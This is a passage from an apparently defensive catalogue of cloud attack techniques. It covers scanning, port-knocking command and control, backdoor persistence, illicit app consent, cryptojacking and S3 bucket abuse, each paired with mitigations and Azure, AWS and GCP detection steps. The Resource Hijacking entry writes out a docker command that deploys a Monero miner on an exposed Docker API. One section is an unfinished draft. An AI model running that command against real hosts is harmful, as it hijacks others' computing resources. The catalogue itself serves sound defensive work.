| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |



References


1.<https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jenkins>. Accessed July 13, 2020.


2.https://thenewstack.io/poorly-configured-ci-cd-systems-can-be-a-backdoor-into-your-infrastructure/. Accessed July 06, 2020.


3.https://www.youtube.com/watch?v=mpUDqo7tIk8. Accessed July 06, 2020


4.https://github.com/spaceB0x/cider. Accessed July 07, 2020


5.https://github.com/claudijd/rotten\_apple. Accessed July 07, 2020


# Network Service Scanning(version 1.0)


**Cloud Service Label: IaaS**


Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.


Within cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems. The most frequently targeted services and ports on the cloud are port 22 (SSH) and port 3389 (RDP). Cloud administrators often leave these services open to enable quick remote access to IaaS resources. In Azure by default these ports are open to the world when a VM is first created and need to be purposefully secured after creation.


## Examples



| **Name** | **Description** |
| --- | --- |
| Flan Scan | Lightweight network vulnerability scanner created by Cloudflare that can be used to find open ports, identify services, and provide list of CVEs and vulnerabilities. Easier to run inside cloud environment |


Mitigations




| **Name** | **Description** |
| --- | --- |
| Disable or Remove Feature or Program | Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation. |
| Network Intrusion Prevention | Use network intrusion detection/prevention systems to detect and prevent remote service scans. |
| Network Segmentation | Ensure proper network segmentation is followed to protect critical servers and devices. |


Detection


System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.


Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans. Routinely inspect SSH and RDP logs on hosts to detect brute force or other probing attacks.


References


1.<https://github.com/cloudflare/flan>. Accessed July 24, 2020.


# Network Share Discovery(version 1.0)


**Cloud Service Label: IaaS**


Description


Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.


Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.


Cloud virtual networks may contain remote network shares or file storage services accessible to an adversary after they have obtained access to a system. For example, AWS and Azure support creation of Network File System (NFS) shares and Server Message Block (SMB) shares that may be mapped on endpoint or cloud-based systems.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Manage log data like other sensitive data | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. |


Detection


System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.


In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be sufficient due to frequent use during normal operations.


References


# Permission Groups Discovery(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may attempt to find local system or domain-level groups and permissions settings.


*Office 365 and Azure AD*


With authenticated access there are several tools that can be used to find permissions groups. The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.


Azure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command az ad user get-member-groups will list groups associated to a user account.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Manage log data like other sensitive data | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. |


Detection


Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with API to gather information. Monitor the API logs in Azure and AWS for queries regarding Permission Groups.


References


# Port Knocking – C&C(version 1.1)


**Cloud Service Label: IaaS, PaaS**


Description


Malicious rootkits on a host in the cloud still require a method of command and control to accomplish adversary objectives. If a compromised cloud host happens to be hosting a public web server or other publicly accessible network service, it is possible to secretly communicate with a rootkit that resides on this host by sending application packets to the service with carefully encoded source ports. In this way the traffic will pass through any firewalls or network security groups which are programmed to let port traffic destined to the service through. Once the packet is delivered to the cloud host, the rootkit can sniff the packet and interpret the source ports as directives.


Examples




| **Name** | **Description** |
| --- | --- |
| Cloud Snooper | Publicly published attack on AWS hosted web servers that already had been implanted with malware. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |


Detection


Detecting the presence of port-knocking command and control might be possible based on an examination of simple network flow records. In the known exploit, source ports of packets were not increasing monotonically as is the custom from the same IP client. An inspection of flow records from the host would reveal odd behavior as the source ports of packets were jumping around and were both increasing and decreasing by huge amounts in short order.


References


1. https://news.sophos.com/wp-content/uploads/2020/02/CloudSnooper\_report.pdf. Accessed Feb 28, 2020.


# Redundant Access(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated.


If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may “backdoor” user accounts by adding additional permissions or access keys associated with otherwise valid accounts. Adversaries may also retain access through cloud-based infrastructure such as creating their own bastion host within a virtual network.


Use of a[Web Shell](https://attack.mitre.org/techniques/T1100)is one such way to maintain access to a network through an externally accessible Web server.


Examples




| **Name** | **Description** |
| --- | --- |
| Pacu Backdoor Modules | Publicly available modules that make creating hard to find backdoors easy if AWS account access has been established even briefly. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Account Exploitation | Prevent initial exploitation of Cloud accounts. |
| Network Monitoring | Network intrusion detection and prevention systems that use network signatures to identify traffic for specific traffic entering and leaving cloud virtual networks can be monitored via flow logs to identify network traffic that does not belong. Both AWS and Azure have capabilities to also capture PCAP from virtual machines. In Azure this capability is called Network Watcher. PCAP can be run through a signature tool such as Snort to search for tell tale signs of past beacons. |


Detection


Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.


Detection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.


If an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.


References


1.https://medium.com/@rzepsky/playing-with-cloudgoat-part-5-hacking-aws-with-pacu-6abe1cf5780d Accessed August 14,2020


# Registering Apps(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries can utilize cloud app stores to create malicious applications that request permissions to sensitive data. These applications would appear as legitimate to users which could lead to users granting the requested permissions. This is similar to downloading malicious applications on a computer or cellular device. The data exposed to adversaries utilizing this technique can lead to initial access, persistence, and privilege escalation.


Examples




| **Name** | **Description** |
| --- | --- |
| Microsoft (illicit consent grant attack) | Microsoft outlines how an adversary would first register an app with a provider, such as Azure Active Directory. Then an attacker will use that to send an email to users as a “legitimate” request to authenticate which will prompt for the user to grant permissions to the malicious app. It will then have access to information such as mail, forwarding rules, files, contacts, notes, profile, and other information. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Approved Applications Only | Users should only be allowed to install company allowed applications. The applications installed by users should be audited frequently to assure no malicious applications are installed. |


Detection


This can be difficult to detect due to the fact that users are granting permissions to what is seen as a legitimate application.


References


1.https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants?view=o365-worldwide. Accessed July 16, 2020.


# *(rough draft – currently editing)*


Remote Code Execution(version 1.1)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may be able to utilize remote code execution


Examples




| **Name** | **Description** |
| --- | --- |
| CVE-2019-1372 | “A remote code execution vulnerability exists when Azure App Service/ Antares on Azure Stack fails to check the length of a buffer prior to copying memory to it. An attacker who successfully exploited this vulnerability could allow an unprivileged function run by the user to execute code in the context of NT AUTHORITY\system thereby escaping the Sandbox. The security update addresses the vulnerability by ensuring that Azure App Service sanitizes user inputs., aka 'Azure App Service Remote Code Execution Vulnerability'.” |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Two Factor Authentication | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | *AWS* | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | *Azure* | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | *GCP* | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| Enable GKE Metadata Server | | Consider enabling GKE Metadata Server which improves security and replaces Compute Engine VM instances Metadata Server. |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | AWS | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | GCP | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |


Detection


References


1.https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1372.Accessed July 2, 2020.


# Resource Hijacking(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability.


One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the potential for nearly unlimited resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.


Examples




| **Name** | **Description** |
| --- | --- |
| Rhino Security Labs Blog Post (Pacu Tool) | This blog post outlines an attack where an adversary starts with a low-level role with access to ECS and then finds a task role that has permissions that are elevated to what they need. A task definition is edited to be malicious and run a command to pull a shell script from a server being hosted by the adversary. A shell script payload to exfiltrate credentials is created and then using the AWS CLI is used to run a command that is used to run the malicious task definition, this is done using run-task API. The adversary can then receive exfiltrated credentials and use them to continue attacks. |
| Cryptojacking Campaign | On November 24, 2019, a cryptojacking campaign exploited Docker API endpoints to mine Monero. This was done by deploying an Alpine Linux OS container to the exposed Docker API that runs a malicious script from the attackers’ servers and installs a Monero miner. Launching a mining container is as easy as*docker -H 192.168.1.7:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig-o POOL01 -o POOL02 -u WALLET -p PASSWORD -k* |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Limit Resource Requests | Clouds have quota systems that can be used to limit the damage of an adversary requesting large amount of resources in a certain region. |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |
| Monitoring for Regional Activity | Tools like Splunk or even CloudSploit have the ability to alert based on region and ingest CloudTrail logs. In CloudSploit, a plugin called EC2 Max Count can be configured to alert after a certain threshold of EC2 instances is met. Real-Time Events service is another feature of CloudSploit that allows alerts for activity in unused regions. |


References


1.<https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124>. Accessed July 14, 2020.


# Revert Cloud Instance(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be easily facilitated using restoration from VM or data storage snapshots through the cloud management dashboard. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the latter types often reset upon stop/restart of the VM.


Examples




| **Name** | **Description** |
| --- | --- |
|  |  |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
|  | This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features. |


Detection


Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g. tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.


References


# S3/Blob Manipulation(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


By default S3/Blobs are accessible from the public internet if the S3/blob identifier is known and you have the proper credentials. Given this, an adversary with stolen storage credentials can read from existing buckets from anywhere on the Internet and exfiltrate the data stored on them. Malicious actors with more expansive cloud access can stage collected data from other cloud assets within a bucket and then remove contents from the bucket to any external host. They can be also serve out content via HTTPS to allow public consumption of new code.


Although often intended as a temporary solution while working on more challenging aspects of code development, storing code in cloud storage can unintentionally be incorporated into production, leaving consumers of this software vulnerable to code modification when a container or bucket is misconfigured. Adversaries can modify code stored in buckets to implant backdoor software to gain a foothold in what would otherwise be a well-protected enclave. If a storage bucket used for hosting code is ever deleted in the future, adversaries can reclaim the bucket name and without any special privileges stage code for unsuspecting people to invoke. This is especially problematic if web servers are pointing at the repo to fetch some forgotten piece of code.


Examples




| **Name** | **Description** |
| --- | --- |
| Capitol One Data Breach | Using previously obtained credentials attackers accessed sensitive data stored within S3 buckets and exfiltrated it. |
| Hackerone | The Rocket Chat install application was grabbing code from a publicly accessible S3 bucket. When the S3 bucket was deleted, this made the situation even worse. Once a bucket is deleted, anyone with access to AWS can create a bucket of the same name. In this case putting a malicious script within the bucket and waiting for unsuspecting users of the Rocket Chat installation script to fetch and run their payload. |
| Subjack | Open source tool that automates the search for s3 buckets and other cloud resources that are registered in DNS but which no longer exist indicating a possible hijacking opportunity. |
| Scout Suite | Scout Suite is an open source multi-cloud security tool that will check exposed storage APIs for misconfigurations and risks. The tool is compatible with cloud providers like AWS, Azure, GCP, and Alpha versions for Alibaba Cloud and Oracle Cloud Infrastructure. |
| Prowler | Prowler is open source tool on GitHub checks security best practices against AWS CIS Benchmark standards. This includes coverage of IAM, logging, monitoring, networking, CIS Levels 1 and 2, forensics, and even GDPR and HIPAA. Prowler also looks for resources that may or may not be intentionally configured in a way that violates the standards. For example, it will check for an open S3 bucket or a security group with an open port. |
| S3 Inspector | S3 Inspector is an open source tool used to check AWS S3 bucket permissions. The tool will check all account buckets for public access and provide a list of URLs that can be used to access that said public bucket. S3 Inspector can be used as a normal CLI utility or as an AWS Lambda function. |
| DNS Enumeration | An OWASP Bay Area presentation in August 2019 covered the process of performing a port scan on an IP address found in the TXT records of a DNS enumeration process and revealed ssh keys that were used to log into servers hosted with AWS. These private keys were found in a zip file of an open S3 bucket. An RDS database server configuration file was found and username and password hashes were subsequently dumped. |
| S3\_download\_Bucket | Publicly available Pacu module that scans the current account for AWS buckets and prints/stores as much data as it can about each one. With no arguments, this module will enumerate all buckets the account has access to, then prompt you to download all files in the bucket or not. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Use[Network Traffic](https://attack.mitre.org/mitigations/M1037)Policies | | Create and apply AWS/Azure policies that restrict access to S3 buckets or Azure Blobs from external networks. In Azure you can restrict access to blobs to certain networks only during blob creation. |
|  | AWS | An AWS environment can be configured with network ACLs (access control lists) to allow or deny inbound and outbound traffic. This can be accomplished by accessing Amazon VPC and navigating to either inbound or outbound rules depending on the rule the user wishes to add and they can be added, removed, or edited from that panel. Full details about ACLs and how to add rules in AWS can be found here:**https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html.** |
|  | Azure | In Azure storage resources can be tied exclusively to a particular virtual network reducing the chances that it can be accessed externally or from other cloud assets. This can be done multiple ways including the Azure Portal, Azure PowerShell, and Azure CLI (Command Line Interface). Depending on the method used to implement this the procedure can vary, but will include the need to create a security group, create a network security group, associate that network security group with a specific subnet and then create security rules that are associated to the inbound and outbound rules for that subnet. Full details on how to configure this utilizing the various methods can be found below: Azure PowerShell:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-powershell** Azure CLI:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic-cli** |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud . |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Don’t Do it | | Don’t store executable code within cloud storage repos. |
| Encrypt Sensitive Information | | Encrypt data stored at rest in cloud storage. Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications. |
|  | AWS | To encrypt data at rest in an AWS environment first start by configuring the IAM roles and permissions. A policy will need to be created to specify that the data is to be encrypted and then the policy is attached to the instance. Full details on how to accomplish this can be found at:**https://aws.amazon.com/blogs/security/how-to-protect-data-at-rest-with-amazon-ec2-instance-store-encryption/**. |
|  | Azure | To encrypt data at rest in an Azure environment it can be done differently depending on the cloud service the customer is utilizing - normally a check box is presented enabling encryption for data at rest. For SaaS customers this can be enabled or available on each specific service. For PaaS customers there are specific storage and application platforms that are supported. In terms of IaaS customers Azure storage components such as queues and blobs are encrypted by selecting a check box during creation. Azure also allows customers to employ their own encryption in addition to the server side encryption provided by Azure –effectively creating two layers of encryption for all storage assets. Currently this must be done programtically as described here:**https://docs.microsoft.com/en-us/azure/virtual-network/tutorial-filter-network-traffic** Encrypted compute allows for all managed disks, snapshots, and images to be encrypted utilizing a service managed key. The keys are stored in the Azure key vault. Full details on how to accomplish this can be found at:**https://docs.microsoft.com/en-us/azure/security/fundamentals/encryption-atrest.** |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | AWS | Ensure only administrators have access to the S3 Permissions management actions. Grant actions like*List*,*Read*, and*Write*on a by-need basis, with particular attention on the*Write*action. Those with the*Write*action have the ability to delete or put objects into S3 buckets. To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | Disable anonymous access to blob containers with the following steps: 1.Go to*Storage Accounts* 2.For each storage account, go to*Containers*under*BLOB SERVICE* *3.*For each container, click*Access policy* 4.Ensure*Public access level*is set to*Private* |
| Microsoft Blob Storage Security Recommendations | | Microsoft’s article contains recommendations for blob storage related to data protection, identity and access management, networking, logging, and monitoring. Azure Security Center is highly recommended to protect resources within Azure. It also provides recommendations on how to fix vulnerabilities. Full details for Microsoft’s security recommendations for blob storage can be found at[**https://docs.microsoft.com/en-us/azure/storage/blobs/security-recommendations**](https://docs.microsoft.com/en-us/azure/storage/blobs/security-recommendations)**.** |
| AWS S3 Security Best Practices | | Amazon’s article highlights best practices for S3 like ensuring S3 buckets are not publicly accessible, using IAM roles for applications services as related to S3, implementing encryption of data at rest, data in transit, and many others. Full details for AWS’s security best practices for S3 can be found at[**https://docs.aws.amazon.com/AmazonS3/latest/dev/security-best-practices.html**](https://docs.aws.amazon.com/AmazonS3/latest/dev/security-best-practices.html)**.** |
| Multi-factor Authentication | | Use multi-factor authentication for user and privileged accounts. Do not manage Cloud portals from machines that perform user email and web browsing tasks. All users should be required to utilize two factor authentication. |
|  | AWS | This can be enforced by first creating a policy that would prohibit actions except those that allow a user to change their password or manage 2FA, then attaching a policy to a group that includes all user accounts where they can be allowed all access if they sign in with 2FA. Once these actions are completed it should be tested to verify the access is given correctly. To see full details on how to complete this view AWS documentation at:**https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial\_users-self-manage-mfa-and-creds.html.** |
|  | Azure | This can be done by creating a MFA registration policy. It can than be assigned to all users (with the ability to exclude some if need be, but is not recommended). Make sure once the policy is created and added to users that it is then being enforced, once enforced it should be tested for verification. To see full details on how to complete this view Azure documentation at:**https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/howto-identity-protection-configure-mfa-policy.** |
|  | GCP | This can be done by first enabling it on the current account being used by admin to assign the roles, then enable two factor on an instance by instance or project by project basis, then assigning the requirements based on IAM roles and applying it to all users. To see full details on how to complete this view Azure documentation at:**https://cloud.google.com/compute/docs/oslogin/setup-two-factor-authentication.** |
| Restrict File and Directory Permissions | | Users should have limited access to files and directories depending on their need for access. The file and directory permissions should be restricted on the basis of least privilege. |
|  | AWS | To manage the files and directory permissions in AWS, IAM policies can be used. This can be done by utilizing group policies and policy variables. The policy would be created specifying the folder, then the permissions attached to that folder (whether the user has access to list out the objects within the directory, if they have read permissions, if they have write permissions, etc.), lastly the group that it applies to would be specified. The users can that be added and removed from that group as needed. Full details on how this can be done is explained here:**https://aws.amazon.com/blogs/security/writing-iam-policies-grant-access-to-user-specific-folders-in-an-amazon-s3-bucket/.** |
|  | Azure | To manage the files and directory permissions in an Azure environment basic and advanced system defined controls. This will be dependent on the type of system being used (Windows, Linux, etc). The permissions will be set individually or by group using the system commands or controls needed.. Full details on how this can be done is explained here:[**https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions**](https://docs.microsoft.com/en-us/azure/storage/files/storage-files-identity-ad-ds-configure-permissions)**.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Enable S3 Bucket Logging | To enable CloudTrail S3 bucket logging: 1.Navigate to CloudTrail console at Go to the Amazon CloudTrail console 2.Click Trails in the API activity history pane on the left 3.Sign into AWS Management Console and open the S3 console Sign in to the AWS Management Console and open the S3 console 4.Click on a bucket under*All Buckets* 5.Click on*Properties* 6.Under*Bucket:\_<bucket\_name>\_*click*Logging* 7.Ensure*Enabled*is checked |
| Create Log Metric Filters and Alarms for S3 | To create a metric filter and alarm: 1.Create a filter that checks for S3 bucket policy changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
